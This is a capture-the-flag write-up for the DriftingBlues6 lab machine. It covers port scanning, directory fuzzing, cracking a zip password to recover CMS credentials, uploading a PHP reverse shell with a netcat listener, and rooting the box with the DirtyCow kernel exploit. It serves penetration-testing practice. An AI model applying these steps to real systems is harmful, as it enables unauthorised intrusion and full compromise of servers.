---
{"dg-publish":true,"permalink":"/write-ups/proving-grounds-play/drifting-blues6/","tags":["CTF","write-up"]}
---


![Pasted image 20241213092656.png|300](/img/user/attachments/Pasted%20image%2020241213092656.png)

---

> [!INFO] Info about DriftingBlues6
>  Born under a bad sign.

> [!FAQ]- Hints
> No Hints.

---
# Active reconnaissance

## Port scan
Perform a quick general scan on all ports.
```shell
sudo nmap TARGET_IP -n -p- -sS -Pn -vvv --open --min-rate 5000 -oN nmap_scan
```

```c
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 61
```

---
# Enumeration
Perform a deep scan with common scripts only on ports we are interested in.
```shell
sudo nmap TARGET_IP -sCV -p 80 -oN nmap_enum
```
## OS
Linux
## Port 80 - Apache
tcp open  http    **Apache** httpd **2.2.22** ((Debian))
http-server-header: Apache/2.2.22 (Debian)
http-title: driftingblues
| http-robots.txt: 1 disallowed entry
/textpattern/textpattern

Check *robots.txt*
![Pasted image 20241212204902.png](/img/user/attachments/Pasted%20image%2020241212204902.png)
The page:
http://192.168.210.219/textpattern/textpattern/index.php
![Pasted image 20241212221507.png](/img/user/attachments/Pasted%20image%2020241212221507.png)
### Fuzz
```shell
ffuf -c -t 100 -u http://192.168.210.219/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -mc all -fc 404 -e .zip
```
I found a zip file named *spammer.zip*
192.168.210.219/spammer.zip
Download it, and I'll exploit it on the exploitation section below.

I ran the fuzzing under the subdirectory *textpattern*
```shell
ffuf -c -t 100 -u http://192.168.210.219/textpattern/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -mc all -fc 404 -e .zip
```
Some interesting sudirectories:
**files**, images, rpc, textpattern, themes
*Files* is empty but probably the files will be uploaded there

---
# Exploitation
## Brute force to the zipfile
Get a hash from the *zipfile*
```shell
zip2john spammer.zip > zip_hash.txt
```
![Pasted image 20241212211735.png](/img/user/attachments/Pasted%20image%2020241212211735.png)

Crack the hash
```shell
john --wordlist=/usr/share/wordlists/passwords/rockyou.txt zip_hash.txt
```
![Pasted image 20241212211945.png|600](/img/user/attachments/Pasted%20image%2020241212211945.png)

Uncompress the file
```shell
unzip spammer.zip
```
![Pasted image 20241212212132.png](/img/user/attachments/Pasted%20image%2020241212212132.png)

Read the file *creds.txt*
![Pasted image 20241212221013.png](/img/user/attachments/Pasted%20image%2020241212221013.png)
There are credentials to login on the website.

Login to the login page:
![Pasted image 20241212221555.png|500](/img/user/attachments/Pasted%20image%2020241212221555.png)
## RCE
On the panel click on *Content* the *Files*
![Pasted image 20241212222316.png|500](/img/user/attachments/Pasted%20image%2020241212222316.png)
Select the file: I use the kali PHP reverse shell */usr/share/webshells/php/php-reverse-shell.php* (Change the IP and Port)
![Pasted image 20241212222354.png|600](/img/user/attachments/Pasted%20image%2020241212222354.png)
The file was uploaded
![Pasted image 20241212222615.png|500](/img/user/attachments/Pasted%20image%2020241212222615.png)

Check the *files* subdirectory from the enumeration phase and the file is there.
![Pasted image 20241212223008.png|500](/img/user/attachments/Pasted%20image%2020241212223008.png)

Set the listener
```shell
rlwrap nc -lnvp 4747
```

Open the file *php-reverse-shell.php*

We got the shell as the user `www-data`
![Pasted image 20241212223204.png|500](/img/user/attachments/Pasted%20image%2020241212223204.png)

---
# Privilege escalation
## Dirty Cow
The linux kernel version is old
![Pasted image 20241212230717.png](/img/user/attachments/Pasted%20image%2020241212230717.png)
It's vulnerable to *DirtyCow* [[CVE-2016-5195\|CVE-2016-5195]]

Create the file [[c0w.c\|c0w.c]] and transfer to the victim machine
Compile [[c0w.c\|c0w.c]]
```shell
gcc -pthread c0w.c -o c0w 
```

And execute it
```shell
./c0w
```

![Pasted image 20241212230651.png](/img/user/attachments/Pasted%20image%2020241212230651.png)

> [!check] Root flag
> ![Pasted image 20241212231207.png](/img/user/attachments/Pasted%20image%2020241212231207.png)

---